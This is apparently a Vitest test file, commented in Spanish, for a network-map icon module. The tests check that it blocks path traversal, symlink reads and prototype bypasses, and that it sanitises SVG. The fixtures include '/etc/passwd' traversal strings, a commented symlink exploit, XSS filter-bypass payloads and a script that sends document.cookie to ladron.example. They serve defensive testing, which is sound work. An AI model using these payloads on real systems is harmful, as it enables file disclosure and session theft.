import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { mkdtemp, rm, writeFile, mkdir, symlink } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

// El directorio de iconos se resuelve al importar el módulo, así que la
// variable de entorno tiene que estar puesta ANTES del import dinámico.
let raiz: string;
let iconos: typeof import('@/lib/iconos');

beforeAll(async () => {
  raiz = await mkdtemp(join(tmpdir(), 'dude-iconos-'));
  await mkdir(join(raiz, 'files'), { recursive: true });
  process.env.DUDE_FILES_DIR = raiz;
  iconos = await import('@/lib/iconos');
});

afterAll(async () => {
  await rm(raiz, { recursive: true, force: true });
});

describe('rutaSegura', () => {
  it('acepta rutas dentro del directorio de The Dude', () => {
    expect(iconos.rutaSegura('files/router.svg')).toContain('files/router.svg');
  });

  it('rechaza el escape con ..', () => {
    // `rel_path` sale de la base y la llena un ETL que lee blobs de 2011.
    // No es entrada de usuario, pero tampoco es de fiar.
    expect(iconos.rutaSegura('../../etc/passwd')).toBeNull();
    expect(iconos.rutaSegura('files/../../../etc/shadow')).toBeNull();
  });

  it('rechaza rutas con byte nulo', () => {
    expect(iconos.rutaSegura('files/a\0.svg')).toBeNull();
  });

  it('rechaza la cadena vacía', () => {
    expect(iconos.rutaSegura('')).toBeNull();
  });

  it('normaliza las barras invertidas de Windows', () => {
    expect(iconos.rutaSegura('files\\ap.svg')).toContain('files/ap.svg');
  });
});

/**
 * A1 — la lectura arbitraria por enlace simbólico.
 *
 * `rutaSegura` normaliza `..` pero no sigue enlaces, así que un enlace con
 * nombre de imagen servía cualquier archivo del disco. Estaba explotado:
 *
 *     ln -sfn /etc/passwd files/enlace.png
 *     curl .../iconos/enlace.png    → root:x:0:0:...
 */
describe('rutaDeArchivo · enlaces simbólicos', () => {
  it('rechaza un enlace que APUNTA AFUERA aunque se llame .png', async () => {
    const afuera = join(raiz, '..', `blanco-${process.pid}.txt`);
    await writeFile(afuera, 'secreto de afuera');
    await symlink(afuera, join(raiz, 'files', 'fuga.png'));
    try {
      expect(await iconos.rutaDeArchivo('files/fuga.png')).toBeNull();
    } finally {
      await rm(afuera, { force: true });
    }
  });

  it('🔴 rechaza un enlace que apunta ADENTRO a un archivo que no es imagen', async () => {
    // Este es el caso que la contención sola NO resuelve: `certificate.pem`
    // vive DENTRO de `files/`, así que verificar que el destino cae adentro de
    // la raíz lo aprueba. Y la lista blanca mira la ruta pedida (`cert.png`),
    // no la del destino. Por eso el enlace se rechaza de plano.
    await writeFile(join(raiz, 'certificate.pem'), '-----BEGIN PRIVATE KEY-----');
    await symlink(join(raiz, 'certificate.pem'), join(raiz, 'files', 'cert.png'));
    expect(await iconos.rutaDeArchivo('files/cert.png')).toBeNull();
  });

  it('un archivo común sí pasa', async () => {
    await writeFile(join(raiz, 'files', 'real.svg'), '<svg viewBox="0 0 8 8"><rect/></svg>');
    expect(await iconos.rutaDeArchivo('files/real.svg')).toContain('real.svg');
  });

  it('lo que no está en la lista blanca de extensiones no pasa', async () => {
    await writeFile(join(raiz, 'files', 'notas.txt'), 'hola');
    expect(await iconos.rutaDeArchivo('files/notas.txt')).toBeNull();
  });

  it('un directorio no es un archivo', async () => {
    await mkdir(join(raiz, 'files', 'carpeta.png'), { recursive: true });
    expect(await iconos.rutaDeArchivo('files/carpeta.png')).toBeNull();
  });

  it('leerIcono tampoco lee a través de un enlace', async () => {
    const afuera = join(raiz, '..', `svg-afuera-${process.pid}.svg`);
    await writeFile(afuera, '<svg viewBox="0 0 4 4"><circle r="1"/></svg>');
    await symlink(afuera, join(raiz, 'files', 'enlazado.svg'));
    try {
      expect(await iconos.leerIcono('files/enlazado.svg')).toBeNull();
    } finally {
      await rm(afuera, { force: true });
    }
  });
});

/**
 * M8 — la lista blanca que se atravesaba por el prototipo.
 *
 * `TIPOS_IMAGEN['constructor']` devuelve la función heredada, que es truthy,
 * así que el chequeo «¿es una imagen conocida?» aprobaba una extensión que no
 * está en la lista. Y esa guarda decide si se toca el disco.
 */
describe('la lista blanca de extensiones no se atraviesa por el prototipo', () => {
  for (const clave of ['constructor', 'toString', 'valueOf', '__proto__', 'hasOwnProperty']) {
    it(`no acepta la extensión heredada «${clave}»`, async () => {
      expect(Object.hasOwn(iconos.TIPOS_IMAGEN, clave)).toBe(false);
      expect(await iconos.rutaDeArchivo(`files/algo.${clave}`)).toBeNull();
      const pincel = await iconos.pincelDeIcono(`files/algo.${clave}`, 'equipo');
      // Cae al repuesto, no a una URL servible.
      expect(pincel.tipo).toBe('simbolo');
    });
  }
});

describe('higienizar', () => {
  it('saca los script', () => {
    const sucio = '<svg><script>fetch("/api")</script><circle r="1"/></svg>';
    const limpio = iconos.higienizar(sucio);
    expect(limpio).not.toContain('script');
    expect(limpio).toContain('circle');
  });

  it('saca los manejadores de evento', () => {
    const limpio = iconos.higienizar('<svg><rect onload="alert(1)" onclick=x() /></svg>');
    expect(limpio).not.toMatch(/onload|onclick/i);
  });

  it('saca foreignObject, que puede meter HTML arbitrario', () => {
    const limpio = iconos.higienizar(
      '<svg><foreignObject><iframe src="x"></iframe></foreignObject><path d="M0 0"/></svg>',
    );
    expect(limpio).not.toMatch(/foreignObject|iframe/i);
    expect(limpio).toContain('path');
  });

  it('saca los href javascript:', () => {
    const limpio = iconos.higienizar('<svg><a href="javascript:alert(1)"><rect/></a></svg>');
    expect(limpio).not.toContain('javascript:');
  });

  it('no toca el dibujo legítimo', () => {
    const bueno = '<svg viewBox="0 0 24 24"><path d="M1 2 L3 4" fill="#f00"/></svg>';
    expect(iconos.higienizar(bueno)).toContain('M1 2 L3 4');
  });
});

/**
 * Los bypasses MEDIDOS contra la versión anterior, que era lista negra.
 *
 * Cada uno de estos pasaba entero. Están acá con el texto exacto para que si
 * alguien vuelve a una lista negra —o afloja la blanca— se entere en el acto.
 */
describe('higienizar · los bypasses que atravesaban la lista negra', () => {
  const peligroso = /<script|javascript:|<animate|<set\b|onload|onerror|onclick|url\(\s*['"]?http/i;

  it('anidado: la lista negra RECONSTRUÍA el <script> al sacar el de adentro', () => {
    // El reemplazo de `<script>…</script>` sacaba el interior y pegaba
    // `scr` + `ipt`, fabricando la etiqueta que venía a eliminar.
    const limpio = iconos.higienizar(
      '<svg><scr<script>x</script>ipt>alert(1)</scr<script>y</script>ipt></svg>',
    );
    expect(limpio).not.toMatch(peligroso);
    expect(limpio).not.toContain('<script');
  });

  it('sin cierre: el patrón exigía </script> y sin eso pasaba entero', () => {
    expect(iconos.higienizar('<svg><script>alert(1)</svg>')).not.toMatch(peligroso);
  });

  it('animate: el javascript: viaja en values, no en href', () => {
    const limpio = iconos.higienizar(
      '<svg><a><animate attributeName="href" values="javascript:alert(1)"/><rect/></a></svg>',
    );
    expect(limpio).not.toMatch(peligroso);
  });

  it('set: la misma idea con to=', () => {
    const limpio = iconos.higienizar(
      '<svg><a><set attributeName="href" to="javascript:alert(1)"/><rect/></a></svg>',
    );
    expect(limpio).not.toMatch(peligroso);
  });

  it('no deja salir referencias a la red', () => {
    expect(iconos.higienizar('<svg><use xlink:href="http://malo/x.svg#a"/></svg>')).not.toMatch(
      /http/i,
    );
    expect(
      iconos.higienizar('<svg><rect fill="url(http://malo/x#a)" style="fill:url(http://malo/y)"/></svg>'),
    ).not.toMatch(/http/i);
  });

  it('un elemento desconocido no se lleva puesto el dibujo que tiene adentro', () => {
    // `<a>` no está permitido, pero el `<rect>` de adentro sí es dibujo.
    expect(iconos.higienizar('<svg><a><rect/></a></svg>')).toContain('<rect');
  });

  it('🔴 CONSERVA las referencias internas — acá es donde una lista blanca entusiasta deja el icono en blanco', () => {
    const limpio = iconos.higienizar(
      '<svg><defs><linearGradient id="grad1"><stop offset="0" stop-color="#fff"/></linearGradient></defs>' +
        '<rect fill="url(#grad1)" style="stroke:red;fill:url(#grad1)"/><use xlink:href="#c1"/></svg>',
    );
    expect(limpio).toContain('id="grad1"');
    expect(limpio).toContain('url(#grad1)');
    expect(limpio).toContain('xlink:href="#c1"');
    expect(limpio).toContain('stroke:red');
    expect(limpio).toContain('<stop');
  });

  it('conserva el case canónico de los atributos de SVG', () => {
    // `viewbox` en minúsculas depende de la tabla de corrección del parser de
    // HTML. Emitirlo bien no depende de nadie.
    const limpio = iconos.higienizar('<svg viewBox="0 0 24 24" gradientUnits="userSpaceOnUse"/>');
    expect(limpio).toContain('viewBox="0 0 24 24"');
    expect(limpio).toContain('gradientUnits=');
  });
});

describe('leerIcono', () => {
  it('lee del disco y extrae el viewBox', async () => {
    await writeFile(
      join(raiz, 'files', 'router.svg'),
      '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><circle cx="24" cy="24" r="20"/></svg>',
    );
    const ico = await iconos.leerIcono('files/router.svg');
    expect(ico).not.toBeNull();
    expect(ico!.viewBox).toBe('0 0 48 48');
    expect(ico!.cuerpo).toContain('circle');
    expect(ico!.monocromo).toBe(false);
  });

  it('fabrica el viewBox desde width y height si no lo trae', async () => {
    await writeFile(
      join(raiz, 'files', 'sinvb.svg'),
      '<svg width="32" height="32"><rect width="32" height="32"/></svg>',
    );
    expect((await iconos.leerIcono('files/sinvb.svg'))!.viewBox).toBe('0 0 32 32');
  });

  it('devuelve null si el archivo no existe, sin tirar excepción', async () => {
    // Que falte un icono no puede dejar al operador sin mapa.
    expect(await iconos.leerIcono('files/no-existe.svg')).toBeNull();
  });

  it('no incrusta nada que no sea svg', async () => {
    // Un PNG no se incrusta: se sirve por URL. Y un .pem no se toca jamás.
    await writeFile(join(raiz, 'files', 'clave.pem'), 'ESTO NO SE SIRVE');
    await writeFile(join(raiz, 'files', 'router.png'), 'PNG falso');
    expect(await iconos.leerIcono('files/clave.pem')).toBeNull();
    expect(await iconos.leerIcono('files/router.png')).toBeNull();
  });

  it('no lee nada fuera del directorio', async () => {
    expect(await iconos.leerIcono('../../../etc/hosts.svg')).toBeNull();
  });

  it('el contenido peligroso llega ya higienizado', async () => {
    await writeFile(
      join(raiz, 'files', 'malo.svg'),
      '<svg viewBox="0 0 10 10"><script>alert(1)</script><rect width="10" height="10"/></svg>',
    );
    const ico = await iconos.leerIcono('files/malo.svg');
    expect(ico!.cuerpo).not.toContain('script');
    expect(ico!.cuerpo).toContain('rect');
  });
});

/**
 * Un SVG con toda la basura que le mete un editor de la época: declaración
 * XML, DOCTYPE, namespaces de Inkscape/sodipodi, `<metadata>`, un degradado
 * referenciado por `url(#id)` y un `<use xlink:href="#id">` interno.
 *
 * Es el caso que importa: el higienizado tiene que sacar lo ejecutable SIN
 * romper el dibujo. Una lista negra demasiado entusiasta que se coma el
 * `xlink:href` interno deja el icono en blanco y nadie se entera.
 */
const SVG_DE_EDITOR = `<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
     xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
     width="48" height="48" viewBox="0 0 48 48" version="1.1" id="svg2">
  <!-- icono de The Dude -->
  <defs id="defs4">
    <linearGradient id="grad1" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0" style="stop-color:#7ec0ee;stop-opacity:1" id="stop1"/>
    </linearGradient>
  </defs>
  <metadata id="metadata7"><dc:title>globe</dc:title></metadata>
  <g inkscape:label="Capa 1" transform="translate(0,-4)" id="layer1">
    <circle cx="24" cy="28" r="19" style="fill:url(#grad1);stroke-width:2" id="c1"/>
    <path d="M 5,28 H 43" style="fill:none;stroke:#ffffff" id="p1"/>
    <use xlink:href="#c1" id="u1"/>
  </g>
</svg>`;

describe('higienizar · SVG real de editor', () => {
  it('conserva el dibujo entero', () => {
    const c = iconos.higienizar(SVG_DE_EDITOR);
    for (const parte of [
      '<linearGradient',
      'stop-color:#7ec0ee',
      'url(#grad1)',
      '<circle',
      '<path',
      'transform="translate(0,-4)"',
      // Referencia INTERNA: no se toca. Es la que hace funcionar los degradados
      // y los símbolos reutilizados.
      'xlink:href="#c1"',
    ]) {
      expect(`${parte}: ${c.includes(parte)}`).toBe(`${parte}: true`);
    }
  });

  it('descarta la basura del editor, que no dibuja nada', () => {
    // Antes esto se conservaba, porque la lista negra sólo sacaba lo que
    // reconocía como peligroso y dejaba pasar todo lo demás. Con lista blanca
    // sale sólo lo que dibuja: `inkscape:label` y `<metadata>` no dibujan.
    //
    // No es sólo prolijidad. `<metadata>` es texto arbitrario del archivo que
    // se incrusta en nuestro documento; que no salga es una superficie menos.
    const c = iconos.higienizar(SVG_DE_EDITOR);
    expect(c).not.toContain('inkscape:');
    expect(c).not.toContain('sodipodi:');
    expect(c).not.toContain('<metadata');
    expect(c).not.toContain('dc:title');
    // Pero el dibujo del grupo que llevaba esos atributos sigue entero.
    expect(c).toContain('<g');
    expect(c).toContain('transform="translate(0,-4)"');
  });

  it('saca la declaración XML, el DOCTYPE y los comentarios', () => {
    const c = iconos.higienizar(SVG_DE_EDITOR);
    expect(c).not.toContain('<?xml');
    expect(c).not.toContain('DOCTYPE');
    expect(c).not.toContain('icono de The Dude');
  });

  it('leerIcono lo interpreta y saca el viewBox correcto', async () => {
    await writeFile(join(raiz, 'files', 'globe.svg'), SVG_DE_EDITOR);
    const ico = await iconos.leerIcono('files/globe.svg');
    expect(ico!.viewBox).toBe('0 0 48 48');
    expect(ico!.cuerpo).toContain('linearGradient');
    expect(ico!.cuerpo).not.toContain('<svg');
  });

  it('un SVG hostil pierde lo ejecutable y conserva el dibujo', async () => {
    await writeFile(
      join(raiz, 'files', 'malicioso.svg'),
      `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
         <script>fetch('https://ladron.example/'+document.cookie)</script>
         <rect width="24" height="24" onload="alert(1)" onclick=robar() fill="#f00"/>
         <a href="javascript:alert(2)"><text>tocame</text></a>
         <foreignObject><iframe src="//malo"></iframe></foreignObject>
       </svg>`,
    );
    const c = (await iconos.leerIcono('files/malicioso.svg'))!.cuerpo;
    for (const p of [
      '<script',
      'document.cookie',
      'onload',
      'onclick',
      'javascript:',
      'foreignObject',
      '<iframe',
    ]) {
      expect(`${p}: ${c.includes(p)}`).toBe(`${p}: false`);
    }
    expect(c).toContain('<rect');
    expect(c).toContain('#f00');
  });
});

describe('claveRepuesto', () => {
  it('reconoce por nombre de archivo de The Dude', () => {
    expect(iconos.claveRepuesto('router.svg')).toBe('router');
    expect(iconos.claveRepuesto('ap.svg')).toBe('ap');
    expect(iconos.claveRepuesto('switch.svg')).toBe('switch');
    expect(iconos.claveRepuesto('client.svg')).toBe('cliente');
    expect(iconos.claveRepuesto('globe.svg')).toBe('globo');
  });

  it('reconoce por la convención de nombres del ISP', () => {
    expect(iconos.claveRepuesto('Vega_P_Aurora_AC2')).toBe('ap');
    expect(iconos.claveRepuesto('CPE_Bahia_0031')).toBe('cliente');
    expect(iconos.claveRepuesto('RT_Core_A')).toBe('router');
    expect(iconos.claveRepuesto('SW_DC_01')).toBe('switch');
    expect(iconos.claveRepuesto('SRV_Radius')).toBe('server');
  });

  // Los nombres de archivo que están DE VERDAD en la base del ISP.
  // Si el directorio no se monta, el repuesto tiene que acertar igual.
  it('reconoce los modelos concretos del catálogo real', () => {
    const esperado: Record<string, string> = {
      'nanomder.png': 'ap',
      'nanomizq.png': 'ap',
      'nanoloco5m_izq.png': 'ap',
      'nanobridge5m_der.png': 'bridge',
      'basestation.png': 'antena',
      'airfiber-izq.png': 'antena',
      'dish.png': 'antena',
      'panel 5m.jpg': 'antena',
      'rb2011.png': 'router',
      'rb1100.png': 'router',
      'CCR1036-8G-2Splus.png': 'router',
      'RB3011UiAS-RM.png': 'router',
      'olt-tplink.png': 'router',
      'crs305.png': 'switch',
      'crs326-24g-2s.png': 'switch',
      'globe.svg': 'globo',
      'client.svg': 'cliente',
      'dns.svg': 'server',
    };
    for (const [archivo, clave] of Object.entries(esperado)) {
      expect(`${archivo} → ${iconos.claveRepuesto(archivo)}`).toBe(`${archivo} → ${clave}`);
    }
  });

  it('lo que no reconoce cae en genérico, no en vacío', () => {
    expect(iconos.claveRepuesto('zzz')).toBe('generico');
    expect(iconos.claveRepuesto(null)).toBe('generico');
  });
});

describe('iconoRepuesto', () => {
  it('usa currentColor para poder teñirse con el tema', () => {
    // Es la razón de existir de los de repuesto: un SVG cargado por <image>
    // no hereda el color y quedaría negro sobre fondo oscuro.
    const ico = iconos.iconoRepuesto('router.svg');
    expect(ico.cuerpo).toContain('currentColor');
    expect(ico.monocromo).toBe(true);
    expect(ico.viewBox).toBe('0 0 24 24');
  });
});

describe('extension y TIPOS_IMAGEN', () => {
  it('reconoce las extensiones reales del directorio del ISP', () => {
    expect(iconos.extension('images/nanomder.PNG')).toBe('png');
    expect(iconos.extension('panel 5m.jpg')).toBe('jpg');
    expect(iconos.extension('sin-extension')).toBeNull();
  });

  // 🔴 En `data/files/` conviven los iconos con `certificate.pem`, 123 `.log`
  //    y 109 `.txt`. La lista blanca es lo único que separa un panel de una
  //    filtración de la clave privada del servidor de monitoreo.
  it('NO acepta lo que no es imagen', () => {
    for (const ext of ['pem', 'log', 'txt', 'ttf', 'db', 'exe', 'html', 'js']) {
      expect(iconos.TIPOS_IMAGEN[ext]).toBeUndefined();
    }
  });

  it('acepta los formatos que sí usan los mapas', () => {
    expect(iconos.TIPOS_IMAGEN.png).toBe('image/png');
    expect(iconos.TIPOS_IMAGEN.jpg).toBe('image/jpeg');
    expect(iconos.TIPOS_IMAGEN.bmp).toBe('image/bmp');
    expect(iconos.TIPOS_IMAGEN.svg).toBe('image/svg+xml');
  });
});

describe('urlDeIcono', () => {
  it('escapa los espacios: en la base hay «panel 5m.jpg»', () => {
    expect(iconos.urlDeIcono('images/panel 5m.jpg')).toBe('/iconos/images/panel%205m.jpg');
  });

  it('normaliza las barras invertidas y no duplica la raíz', () => {
    expect(iconos.urlDeIcono('\\images\\rb2011.png')).toBe('/iconos/images/rb2011.png');
  });

  it('escapa cada segmento por separado, sin comerse las barras', () => {
    expect(iconos.urlDeIcono('a b/c d.png')).toBe('/iconos/a%20b/c%20d.png');
  });
});

describe('juegoDeIconos', () => {
  it('emite un símbolo por icono distinto, no uno por nodo', async () => {
    const { simbolos, porNodo } = await iconos.juegoDeIconos([
      { id: 1, icono: null, pista: 'CPE_Aurora_0142' },
      { id: 2, icono: null, pista: 'CPE_Aurora_0187' },
      { id: 3, icono: null, pista: 'CPE_Aurora_0203' },
      { id: 4, icono: null, pista: 'RT_Core_A' },
    ]);
    expect(porNodo.size).toBe(4);
    expect(simbolos.size).toBe(2); // cliente y router
    expect(porNodo.get(1)).toEqual(porNodo.get(2));
    expect(porNodo.get(1)).not.toEqual(porNodo.get(4));
  });

  it('prefiere el SVG real sobre el de repuesto', async () => {
    const { simbolos, porNodo } = await iconos.juegoDeIconos([
      { id: 1, icono: 'files/router.svg', pista: 'RT_Core_A' },
    ]);
    expect(porNodo.get(1)).toEqual({ tipo: 'simbolo', clave: 'f-router-svg' });
    expect(simbolos.get('f-router-svg')!.monocromo).toBe(false);
  });

  it('si el SVG no está, el nombre del archivo igual guía el repuesto', async () => {
    const { porNodo } = await iconos.juegoDeIconos([
      { id: 1, icono: 'files/ap.svg', pista: 'nombre_que_no_dice_nada' },
    ]);
    expect(porNodo.get(1)).toEqual({ tipo: 'simbolo', clave: 'r-ap' });
  });

  // 47 de los 56 iconos que usan los mapas reales son PNG, JPG o BMP.
  it('los rasterizados van por URL, no incrustados', async () => {
    const { simbolos, porNodo } = await iconos.juegoDeIconos([
      { id: 1, icono: 'images/nanomder.png', pista: 'Vega_P_Aurora_AC2' },
      { id: 2, icono: 'images/olt-tplink.png', pista: 'OLT' },
    ]);
    expect(porNodo.get(1)).toEqual({ tipo: 'imagen', url: '/iconos/images/nanomder.png' });
    expect(porNodo.get(2)).toEqual({ tipo: 'imagen', url: '/iconos/images/olt-tplink.png' });
    // No se emite ningún símbolo por ellos: el HTML no se infla.
    expect(simbolos.size).toBe(0);
  });

  // El directorio no está montado mientras se desarrolla, y el mapa igual
  // tiene que salir completo: el endpoint devuelve el repuesto con estado 200.
  it('un PNG que no está en disco igual sale por URL', async () => {
    const { porNodo } = await iconos.juegoDeIconos([
      { id: 1, icono: 'images/no-existe.png', pista: 'x' },
    ]);
    expect(porNodo.get(1)).toEqual({ tipo: 'imagen', url: '/iconos/images/no-existe.png' });
  });

  it('un .pem NUNCA se sirve por URL: cae al repuesto', async () => {
    const { porNodo } = await iconos.juegoDeIconos([
      { id: 1, icono: 'files/certificate.pem', pista: 'certificado' },
    ]);
    expect(porNodo.get(1)).toMatchObject({ tipo: 'simbolo' });
  });

  it('mezcla vectoriales y rasterizados en el mismo mapa', async () => {
    const { simbolos, porNodo } = await iconos.juegoDeIconos([
      { id: 1, icono: 'files/router.svg', pista: 'a' },
      { id: 2, icono: 'images/nanomder.png', pista: 'b' },
      { id: 3, icono: null, pista: 'submapa Zona Norte' },
    ]);
    expect(porNodo.get(1)).toMatchObject({ tipo: 'simbolo' });
    expect(porNodo.get(2)).toMatchObject({ tipo: 'imagen' });
    expect(porNodo.get(3)).toEqual({ tipo: 'simbolo', clave: 'r-submapa' });
    expect(simbolos.size).toBe(2);
  });
});

/**
 * 🔴 Medir el archivo, porque `image_scale` es un PORCENTAJE.
 *
 * Un porcentaje sin sobre qué aplicarlo no dice nada: The Dude lo aplica sobre
 * el tamaño natural del archivo. Sin esto, los 127 elementos que están en
 * escala 100 —con naturales de 41 a 628 px— se dibujarían todos iguales.
 */
describe('medirEncabezado', () => {
  /** PNG mínimo: firma de 8 bytes + largo + 'IHDR' + ancho y alto big-endian. */
  function png(w: number, h: number): Buffer {
    const b = Buffer.alloc(24);
    b.writeUInt32BE(0x89504e47, 0);
    b.writeUInt32BE(0x0d0a1a0a, 4);
    b.writeUInt32BE(13, 8);
    b.write('IHDR', 12, 'latin1');
    b.writeUInt32BE(w, 16);
    b.writeUInt32BE(h, 20);
    return b;
  }

  it('lee un PNG', () => {
    expect(iconos.medirEncabezado(png(467, 92))).toEqual({ ancho: 467, alto: 92 });
  });

  it('lee un GIF', () => {
    const b = Buffer.alloc(10);
    b.write('GIF89a', 0, 'latin1');
    b.writeUInt16LE(120, 6);
    b.writeUInt16LE(80, 8);
    expect(iconos.medirEncabezado(b)).toEqual({ ancho: 120, alto: 80 });
  });

  it('lee un BMP, y un alto NEGATIVO es orientación, no tamaño', () => {
    const b = Buffer.alloc(26);
    b.write('BM', 0, 'latin1');
    b.writeInt32LE(64, 18);
    b.writeInt32LE(-48, 22); // filas de arriba hacia abajo
    expect(iconos.medirEncabezado(b)).toEqual({ ancho: 64, alto: 48 });
  });

  it('lee un JPEG caminando los segmentos hasta el SOF', () => {
    // Antes del SOF va un APP0 de largo variable: no se puede leer de un
    // offset fijo, que es el error clásico con JPEG.
    const app0 = Buffer.alloc(18);
    app0.writeUInt16BE(0xffe0, 0);
    app0.writeUInt16BE(16, 2);
    const sof = Buffer.alloc(11);
    sof.writeUInt16BE(0xffc0, 0);
    sof.writeUInt16BE(9, 2);
    sof.writeUInt8(8, 4);
    sof.writeUInt16BE(167, 5); // alto
    sof.writeUInt16BE(167, 7); // ancho
    const b = Buffer.concat([Buffer.from([0xff, 0xd8]), app0, sof]);
    expect(iconos.medirEncabezado(b)).toEqual({ ancho: 167, alto: 167 });
  });

  it('un JPEG con un largo de segmento imposible no cuelga el recorrido', () => {
    const b = Buffer.alloc(40);
    b.writeUInt16BE(0xffd8, 0);
    b.writeUInt16BE(0xffe0, 2);
    b.writeUInt16BE(0, 4); // largo 0: no avanzaría nunca
    expect(iconos.medirEncabezado(b)).toBeNull();
  });

  it('descarta lo absurdo en vez de devolver un icono de 200.000 px', () => {
    expect(iconos.medirEncabezado(png(0, 100))).toBeNull();
    expect(iconos.medirEncabezado(png(999_999, 10))).toBeNull();
  });

  it('un formato que no reconoce devuelve null, no una medida inventada', () => {
    expect(iconos.medirEncabezado(Buffer.from('no soy una imagen'))).toBeNull();
    expect(iconos.medirEncabezado(Buffer.alloc(0))).toBeNull();
  });

  it('medidaDeImagen lee del disco y no se sale de la raíz', async () => {
    await writeFile(join(raiz, 'files', 'medible.png'), png(200, 43));
    await expect(iconos.medidaDeImagen('files/medible.png')).resolves.toEqual({
      ancho: 200,
      alto: 43,
    });
    // Las mismas defensas que el resto del módulo: ni `..` ni nulos.
    await expect(iconos.medidaDeImagen('../../etc/passwd')).resolves.toBeNull();
    await expect(iconos.medidaDeImagen(null)).resolves.toBeNull();
  });

  it('medidasDeIconos saltea los SVG a propósito', async () => {
    // Su `viewBox` está en unidades arbitrarias: compararlo contra los píxeles
    // de un PNG no significa nada.
    const m = await iconos.medidasDeIconos(['files/medible.png', 'files/router.svg', null]);
    expect([...m.keys()]).toEqual(['files/medible.png']);
  });
});
